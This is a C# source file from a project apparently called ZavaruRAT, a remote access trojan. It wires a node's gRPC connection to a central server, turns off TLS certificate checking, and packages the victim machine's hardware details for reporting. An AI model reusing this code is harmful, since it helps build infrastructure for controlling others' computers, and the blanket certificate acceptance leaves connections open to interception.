#region

using Grpc.Core;
using Grpc.Net.Client;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using ZavaruRAT.Node.Runtime;
using ZavaruRAT.Proto;
using ZavaruRAT.Shared.Models.Client;

#endregion

namespace ZavaruRAT.Node;

public static class ZavaruExtensions
{
    public static IServiceCollection AddMainServerClient(this IServiceCollection services)
    {
        return services.AddSingleton(provider =>
        {
            var configuration = provider.GetRequiredService<IConfiguration>();

            var channel = CreateChannel(configuration);

            var actionClient = new ActionHub.ActionHubClient(channel);
            var eventClient = new EventHub.EventHubClient(channel);

            return new MainServerClient(actionClient, eventClient, configuration,
                                        provider.GetRequiredService<ILogger<MainServerClient>>());
        });
    }

    public static GrpcChannel CreateChannel(IConfiguration configuration)
    {
        var credentials = CallCredentials.FromInterceptor((_, metadata) =>
        {
            metadata.Add("Authorization", $"{configuration["Grpc:Token"]}:{configuration["NodeId"]}");
            return Task.CompletedTask;
        });

        var httpHandler = new HttpClientHandler();
        httpHandler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
        var channel = GrpcChannel.ForAddress(configuration["Grpc:Host"]!, new GrpcChannelOptions
        {
            Credentials = ChannelCredentials.Create(new SslCredentials(), credentials),
            HttpHandler = httpHandler
        });

        return channel;
    }

    /// <summary>
    ///     Maps <see cref="DeviceInfo" /> to <see cref="ClientDeviceInfo" />
    /// </summary>
    /// <param name="deviceInfo">The original device info</param>
    /// <returns>Mapped proto object</returns>
    public static ClientDeviceInfo ToProto(this DeviceInfo deviceInfo)
    {
        return new ClientDeviceInfo
        {
            OS = deviceInfo.OS,
            Motherboard = deviceInfo.Motherboard,
            CPU = deviceInfo.CPU,
            GPU = deviceInfo.GPU,
            RAM = deviceInfo.RAM,
            Drives =
            {
                deviceInfo.Drives
            }
        };
    }
}
